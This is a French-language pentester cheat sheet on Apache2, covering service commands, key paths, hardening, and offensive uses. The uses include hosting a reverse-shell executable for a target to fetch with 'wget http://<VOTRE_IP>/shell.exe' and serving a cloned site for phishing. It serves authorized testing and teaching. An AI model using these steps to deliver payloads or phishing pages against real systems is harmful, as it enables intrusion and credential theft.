# 🌐 Apache2 : Le Guide Pratique du Pentester

Apache2 est un serveur web robuste et flexible. En pentest, il est incroyablement utile pour héberger des payloads, des sites de phishing, ou pour créer des environnements de test.

## 🔥 Gestion du Service

Voici les commandes de base pour contrôler le service Apache2 avec `systemctl`.

| Commande | Description |
|---|---|
| `sudo systemctl start apache2` | Démarre le serveur. |
| `sudo systemctl stop apache2` | Arrête le serveur. |
| `sudo systemctl restart apache2` | Redémarre le serveur (après une modification). |
| `sudo systemctl status apache2` | Vérifie si le serveur tourne correctement. |
| `sudo systemctl enable apache2` | Active le démarrage automatique au boot. |

## 🎯 Utilisation en Pentest

Le répertoire web par défaut est `/var/www/html/`. Tout ce que vous placez ici est accessible via `http://<VOTRE_IP>`.

### 1. Héberger un Payload

C'est la méthode la plus simple pour transférer un fichier (comme un reverse shell) sur une machine cible.

```bash
# 1. Copiez votre payload dans le dossier web
sudo cp shell.exe /var/www/html/

# 2. Sur la machine cible, téléchargez-le avec wget, curl, ou un navigateur
wget http://<VOTRE_IP>/shell.exe
```

### 2. Cloner un site pour du Phishing

Vous pouvez héberger une copie d'un site pour une campagne de phishing.

```bash
# 1. Créez un dossier pour votre site cloné
sudo mkdir /var/www/html/clone

# 2. Copiez les fichiers de votre site cloné dedans
sudo cp -r site_clone/* /var/www/html/clone/

# 3. Le site sera accessible à l'adresse http://<VOTRE_IP>/clone/
```

## 📂 Fichiers et Dossiers Clés

- **Configuration principale :** `/etc/apache2/apache2.conf`
- **Sites disponibles :** `/etc/apache2/sites-available/` (où vous définissez vos sites)
- **Sites activés :** `/etc/apache2/sites-enabled/` (liens symboliques vers les sites que vous voulez activer)
- **Logs :** `/var/log/apache2/` (consultez `access.log` et `error.log` pour le dépannage)

## 🛡️ Astuces de Sécurisation (Hardening)

Si vous exposez votre serveur Apache sur internet, pensez à masquer les informations par défaut.

```bash
# Dans /etc/apache2/apache2.conf, ajoutez ou modifiez ces lignes :
ServerTokens Prod
ServerSignature Off
```
Cela empêchera Apache de révéler sa version exacte dans les en-têtes HTTP.

---
> 💡 **Conseil :** Pour un hébergement rapide et temporaire, le module `http.server` de Python (`python3 -m http.server 80`) est souvent plus simple et rapide à mettre en place.
